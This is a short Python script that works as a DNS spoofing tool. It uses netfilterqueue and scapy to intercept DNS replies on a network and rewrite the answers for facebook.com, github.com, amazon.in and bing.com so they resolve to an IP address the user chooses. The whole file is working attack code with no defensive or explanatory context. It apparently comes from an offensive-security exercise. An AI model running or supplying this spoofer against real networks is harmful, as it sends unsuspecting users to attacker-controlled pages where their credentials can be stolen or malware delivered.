#!/usr/bin/env python
import netfilterqueue as netq
import scapy.all as scapy
import optparse
import argparse
def get_args():
    try:
        parser = optparse.OptionParser()
        parser.add_option("-s", "--spoofip", dest="spoof_ip", help="IP of the page to be spoofed as.")
        (val, args) = parser.parse_args()
    except:
        parser = argparse.ArgumentParser()
        parser.add_argument("-s", "--spoofip", dest="spoof_ip", help="IP of the page to be spoofed as.")
        val= parser.parse_args()
    if not val.spoof_ip:
        parser.error("ERROR Missing spoofip argument, use --help for more info")
    return val
def mod_packet(packet):
    use_packet = scapy.IP(packet.get_payload())
    if use_packet.haslayer(scapy.DNSRR):
        request_url = use_packet[scapy.DNSQR].qname
        urls = ["facebook.com", "github.com", "amazon.in", "bing.com"]
        for url in urls:
            if url in request_url:
                print("[+] Spoofing " + request_url + " as " + value.spoof_ip + " ...")
                response = scapy.DNSRR(rrname=request_url, rdata=value.spoof_ip)
                use_packet[scapy.DNS].an = response

                use_packet[scapy.DNS].ancount = 1
                del use_packet[scapy.IP].len
                del use_packet[scapy.IP].chksum
                del use_packet[scapy.UDP].len
                del use_packet[scapy.UDP].chksum

                packet.set_payload(str(use_packet))
    packet.accept()

value = get_args()
queue = netq.NetfilterQueue()
try:
    print("[+] Spoof on target started...\n")
    queue.bind(0, mod_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C... Quiting...")
    print("[+] DNS Spoofing Stopped.")